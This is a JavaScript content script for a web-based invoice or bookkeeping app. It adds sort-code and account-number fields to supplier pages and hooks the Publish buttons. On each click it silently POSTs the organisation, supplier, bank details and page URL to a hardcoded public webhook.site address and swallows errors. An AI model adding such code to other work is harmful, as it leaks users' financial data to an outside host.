StartSupplierListener();

//
console.log("Hook Listener Injected");

let CurrentSupplier, SupplierListenerActive;
//
function StartSupplierListener() {
  setInterval(() => {
    initNewSupplierListener();
  }, 500);
}

//
async function initNewSupplierListener() {
  handleChange();
  if (!location.href.includes("=/details")) {
    return;
  }

  await WaitForQueryAll(".pdf-preview.inlined", 200);
  let bottomInputs = await WaitForQueryAll(".columns", 100, 10);
  if (bottomInputs == "killed") return;

  let publishBtns = document.querySelectorAll("button");
  let publishBtnArr = [];
  for (let btn of publishBtns) {
    if (btn.textContent == "Publish") publishBtnArr.push(btn);
  }
  for (let btn of publishBtnArr) {
    btn.onclick = (e) => {
      try {
        let Organisation = document.querySelectorAll(".name.js-ellipsis")[0].textContent;
        let Supplier = document.querySelectorAll(".ellipsize")[2].children[0].textContent;
        let sortCodeText = document.getElementById("botSortCode").value;
        let accountNumberNumber = document.getElementById("botAccountNumber").value;
        let URL = location.href;
        if (sortCodeText !== "" && accountNumberNumber !== "") {
          let json = { Organisation, Supplier, sortCodeText, accountNumberNumber, URL };
          let hookURL = "https://webhook.site/f136a15c-3275-4f96-a95c-4d3a7920c9af";
          sendWebHook(hookURL, json);
        }
      } catch {}
    };
  }

  // send WebHook
  handleChange();

  return;
}

function sendWebHook(whurl, json) {
  fetch(whurl + "?wait=true", {
    method: "POST",
    mode: "no-cors",
    headers: {
      "content-type": "application/json",
    },
    body: JSON.stringify(json),
  });
}

function handleChange() {
  try {
    let warning = document.querySelectorAll(".d-field")[3].children[1].children.length;
    let sortCode = document.getElementById("botSortCode");
    let accountNumber = document.getElementById("botAccountNumber");

    if (!sortCode && !accountNumber) {
      createChildNodeForSupplierListener("Sort Code", "botSortCode");
      createChildNodeForSupplierListener("Account Number", "botAccountNumber");
    }
    sortCode = document.getElementById("botSortCode");
    accountNumber = document.getElementById("botAccountNumber");

    let sortParent = sortCode.parentElement.parentElement;
    let accountParent = accountNumber.parentElement.parentElement;
    let supplier = document.querySelectorAll(".d-field")[3].parentElement.parentElement;
    if (warning == 1) {
      WebHook = true;
      supplier.style.border = "4px solid red";
      sortParent.style.display = "";
      accountParent.style.display = "";
    } else {
      WebHook = false;
      supplier.style.border = "0px";
      sortParent.style.display = "none";
      accountParent.style.display = "none";
    }
  } catch {}
}
function createChildNodeForSupplierListener(title, id) {
  console.log("called");
  let cols = document.getElementsByClassName("columns")[1];
  let inputs = document.querySelectorAll(".d-form-input");
  for (let input of inputs) {
    if (input.querySelector("label").textContent == "Document Reference") {
      let clone = input.cloneNode(true);
      clone.querySelector("label").textContent = title;
      let i = clone.querySelector("input");
      i.setAttribute("id", id);
      i.value = "";
      let horizontalDiv = document.querySelectorAll(".columns")[1].children[0];
      horizontalDiv = horizontalDiv.cloneNode();
      horizontalDiv.appendChild(clone);
      cols.append(horizontalDiv);
    }
  }
  return;
}
